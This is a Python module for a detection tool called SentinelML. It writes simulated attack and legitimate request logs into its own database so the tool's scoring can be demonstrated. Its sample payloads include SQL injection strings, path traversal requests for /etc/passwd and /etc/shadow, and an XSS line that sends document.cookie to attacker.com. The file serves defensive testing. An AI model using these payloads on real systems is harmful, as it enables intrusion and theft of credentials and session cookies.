"""
Attack & Live Traffic Simulation Engine for SentinelML
Generates realistic cyber attack telemetry and legitimate traffic to demonstrate
real-time detection, ICMF multi-view scoring, and autonomous hunting.
"""

import random
from datetime import timedelta
from django.utils import timezone
from .models import RequestLog, IPRiskProfile
from .detection import calculate_entropy
from .fusion_engine import evaluate_and_fuse_profile


def simulate_sqli(ip="198.51.100.45", count=3):
    """Simulate SQL Injection attack traffic."""
    payloads = [
        ("GET", "/api/search/?q=' UNION SELECT id, username, password FROM auth_user --", 200),
        ("POST", "/products/?category=1' OR '1'='1", 500),
        ("GET", "/users/profile/?id=1; DROP TABLE temp_logs; --", 403),
        ("POST", "/login/?user=admin' OR 1=1 --", 200),
    ]

    profile, _ = IPRiskProfile.objects.get_or_create(ip_address=ip)
    logs_created = []

    for i in range(count):
        method, path, status = random.choice(payloads)
        log = RequestLog.objects.create(
            ip_address=ip,
            method=method,
            path=path,
            status_code=status,
            user_agent="Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0 (sqlmap/1.7.2)",
            response_time_ms=random.uniform(120.0, 380.0),
            is_sqli_suspect=True,
            inferred_intent="SQL Injection Attempt",
            entropy_score=calculate_entropy(path),
            request_rate=12.0
        )
        profile.sqli_count += 1
        logs_created.append(log)

    evaluate_and_fuse_profile(profile, latest_log=logs_created[-1])
    return {'status': 'SUCCESS', 'type': 'SQL Injection', 'ip': ip, 'count': count}


def simulate_brute_force(ip="203.0.113.88", count=6):
    """Simulate Login Brute-Force flood."""
    usernames = ['admin', 'root', 'administrator', 'system', 'sec_admin', 'operator']
    profile, _ = IPRiskProfile.objects.get_or_create(ip_address=ip)
    logs_created = []

    for i in range(count):
        user = usernames[i % len(usernames)]
        log = RequestLog.objects.create(
            ip_address=ip,
            method="POST",
            path="/login/",
            status_code=401,
            user_agent="Hydra/9.5 (Authentication Cracker)",
            response_time_ms=random.uniform(45.0, 95.0),
            username=user,
            is_login_attempt=True,
            login_success=False,
            is_brute_force_suspect=(i >= 4),  # Suspect after threshold
            inferred_intent="Credential Guessing / Brute-Force",
            entropy_score=calculate_entropy(user),
            request_rate=28.0
        )
        if i >= 4:
            profile.brute_force_count += 1
        logs_created.append(log)

    evaluate_and_fuse_profile(profile, latest_log=logs_created[-1])
    return {'status': 'SUCCESS', 'type': 'Login Brute-Force', 'ip': ip, 'count': count}


def simulate_recon(ip="192.0.2.140", count=8):
    """Simulate Reconnaissance & Directory Fuzzing scan."""
    fuzz_paths = [
        "/admin.php", "/wp-login.php", "/.env", "/backup.sql", "/config.json",
        "/api/v1/debug/", "/phpmyadmin/", "/.git/config", "/server-status"
    ]
    profile, _ = IPRiskProfile.objects.get_or_create(ip_address=ip)
    logs_created = []

    for i in range(count):
        path = fuzz_paths[i % len(fuzz_paths)]
        log = RequestLog.objects.create(
            ip_address=ip,
            method="GET",
            path=path,
            status_code=404,
            user_agent="DirBuster-1.0-RC1 (Directory Scanner)",
            response_time_ms=random.uniform(15.0, 45.0),
            is_recon_suspect=(i >= 5),
            inferred_intent="Reconnaissance & Directory Fuzzing",
            entropy_score=calculate_entropy(path),
            request_rate=45.0
        )
        if i >= 5:
            profile.recon_count += 1
        logs_created.append(log)

    evaluate_and_fuse_profile(profile, latest_log=logs_created[-1])
    return {'status': 'SUCCESS', 'type': 'Reconnaissance Scan', 'ip': ip, 'count': count}


def simulate_xss(ip="198.51.100.99", count=3):
    """Simulate Cross-Site Scripting (XSS) injection attacks."""
    payloads = [
        ("/comment/?msg=<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>", 200),
        ("/search/?q=<img src=x onerror=alert('XSS_PAYLOAD_EXEC')>", 200),
        ("/profile/edit/?bio=<iframe src='javascript:alert(1)'>", 400),
    ]
    profile, _ = IPRiskProfile.objects.get_or_create(ip_address=ip)
    logs_created = []

    for i in range(count):
        path, status = payloads[i % len(payloads)]
        log = RequestLog.objects.create(
            ip_address=ip,
            method="POST",
            path=path,
            status_code=status,
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            response_time_ms=random.uniform(60.0, 150.0),
            is_xss_suspect=True,
            inferred_intent="Cross-Site Scripting (XSS)",
            entropy_score=calculate_entropy(path),
            request_rate=8.0
        )
        profile.xss_count += 1
        logs_created.append(log)

    evaluate_and_fuse_profile(profile, latest_log=logs_created[-1])
    return {'status': 'SUCCESS', 'type': 'Cross-Site Scripting (XSS)', 'ip': ip, 'count': count}


def simulate_path_traversal(ip="203.0.113.12", count=3):
    """Simulate Path Traversal / LFI attacks."""
    payloads = [
        "/download/?file=../../../../etc/passwd",
        "/view_log/?file=%2e%2e%2f%2e%2e%2fwindows/win.ini",
        "/static_proxy/?doc=../../../../etc/shadow",
    ]
    profile, _ = IPRiskProfile.objects.get_or_create(ip_address=ip)
    logs_created = []

    for i in range(count):
        path = payloads[i % len(payloads)]
        log = RequestLog.objects.create(
            ip_address=ip,
            method="GET",
            path=path,
            status_code=403,
            user_agent="Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:108.0) Gecko/20100101 Firefox/108.0",
            response_time_ms=random.uniform(30.0, 80.0),
            is_path_traversal_suspect=True,
            inferred_intent="Path Traversal / Local File Inclusion",
            entropy_score=calculate_entropy(path),
            request_rate=6.0
        )
        profile.path_traversal_count += 1
        logs_created.append(log)

    evaluate_and_fuse_profile(profile, latest_log=logs_created[-1])
    return {'status': 'SUCCESS', 'type': 'Path Traversal / LFI', 'ip': ip, 'count': count}


def simulate_normal_traffic(ip="192.168.1.50", count=5):
    """Simulate legitimate clean user browsing."""
    clean_paths = ["/", "/threats/", "/evaluation/", "/hunting/", "/simulator/"]
    logs_created = []

    for i in range(count):
        path = clean_paths[i % len(clean_paths)]
        log = RequestLog.objects.create(
            ip_address=ip,
            method="GET",
            path=path,
            status_code=200,
            user_agent="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko)",
            response_time_ms=random.uniform(12.0, 45.0),
            inferred_intent="Legitimate Web Traffic",
            entropy_score=calculate_entropy(path),
            request_rate=2.0
        )
        logs_created.append(log)

    return {'status': 'SUCCESS', 'type': 'Legitimate Traffic', 'ip': ip, 'count': count}


def simulate_full_killchain(ip="185.220.101.5"):
    """
    Simulate a complete 4-stage Cyber Kill-Chain:
    1. Reconnaissance
    2. Credential Brute-Force
    3. SQL Injection
    4. Data Exfiltration Probe
    """
    simulate_recon(ip=ip, count=6)
    simulate_brute_force(ip=ip, count=5)
    simulate_sqli(ip=ip, count=4)
    simulate_path_traversal(ip=ip, count=2)

    profile = IPRiskProfile.objects.get(ip_address=ip)
    evaluate_and_fuse_profile(profile)

    return {
        'status': 'SUCCESS',
        'type': 'Full Cyber Kill-Chain Campaign',
        'ip': ip,
        'fused_score': profile.fused_score,
        'threat_level': profile.threat_level(),
        'predicted_next_stage': profile.predicted_next_stage
    }
